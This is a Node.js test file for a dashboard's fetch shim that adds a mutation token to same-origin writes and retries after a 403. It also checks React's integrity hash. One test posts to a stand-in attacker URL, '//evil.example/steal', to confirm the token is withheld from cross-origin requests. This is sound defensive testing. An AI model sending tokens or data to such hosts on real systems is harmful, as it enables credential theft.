"use strict";

// #114: the inline fetch shim in index.html attaches the dashboard's mutation
// token to same-origin writes. These run the real script in a vm context.

const test = require("node:test");
const assert = require("node:assert/strict");
const crypto = require("node:crypto");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

const HTML = fs.readFileSync(path.join(__dirname, "index.html"), "utf8");
const SHIM = HTML.match(/<script>\s*(\(function \(\) \{[\s\S]*?var _fetch = window\.fetch[\s\S]*?\}\)\(\);)\s*<\/script>/)[1];

/** Load the shim against a fake server whose current token is `server.token`. */
function load(server) {
  const calls = [];
  const ctx = {
    URL, Headers, Promise, Object,
    location: { origin: "https://dash.example", href: "https://dash.example/" },
  };
  ctx.window = ctx;
  ctx.window.fetch = async (input, init = {}) => {
    const url = typeof input === "string" ? input : input.url;
    if (url === "/api/config") {
      return { ok: true, status: 200, json: async () => ({ token: server.token }) };
    }
    const token = (init.headers && init.headers.get("X-Dashboard-Token")) || null;
    calls.push({ url, token });
    const mutating = (init.method || "GET") !== "GET";
    const status = mutating && token !== server.token ? 403 : 200;
    return { ok: status === 200, status };
  };
  vm.createContext(ctx);
  vm.runInContext(SHIM, ctx);
  return { fetch: ctx.window.fetch, calls };
}

test("a protocol-relative URL is cross-origin and gets no token", async () => {
  const { fetch, calls } = load({ token: "t1" });
  await fetch("//evil.example/steal", { method: "POST" });
  assert.deepEqual(calls, [{ url: "//evil.example/steal", token: null }]);
});

test("same-origin writes carry the token; reads don't", async () => {
  const { fetch, calls } = load({ token: "t1" });
  await fetch("/api/reload", { method: "POST" });
  await fetch("https://dash.example/api/refresh", { method: "POST" });
  await fetch("/api/overview");
  assert.deepEqual(calls.map((c) => c.token), ["t1", "t1", null]);
});

test("a 403 after a server restart refetches the token and retries once", async () => {
  const server = { token: "old" };
  const { fetch, calls } = load(server);
  await fetch("/api/reload", { method: "POST" });  // shim now holds "old"
  server.token = "new";                             // restart without DASHBOARD_TOKEN
  calls.length = 0;

  const r = await fetch("/api/reload", { method: "POST" });

  assert.equal(r.status, 200);
  assert.deepEqual(calls.map((c) => c.token), ["old", "new"]);
});

test("a write that still 403s is retried only once", async () => {
  const server = { token: "t1" };
  const { fetch, calls } = load(server);
  await fetch("/api/overview");
  server.token = { never: "matches" };  // config hands out an object; no header equals it
  calls.length = 0;
  const r = await fetch("/api/reload", { method: "POST" });
  assert.equal(r.status, 403);
  assert.equal(calls.length, 2);
});

// The SRI hash must track the pinned version: bumping React without a new
// hash makes the browser refuse the script and the page comes up blank.
test("React's integrity hash matches the pinned npm file", () => {
  const file = path.join(__dirname, "..", "node_modules", "react", "umd", "react.production.min.js");
  const digest = "sha384-" + crypto.createHash("sha384").update(fs.readFileSync(file)).digest("base64");
  const tag = HTML.match(/<script[^>]*react@18\.3\.1\/umd\/react\.production\.min\.js"[^>]*>/)[0];
  assert.ok(tag.includes(`integrity="${digest}"`), `expected ${digest} in ${tag}`);
});
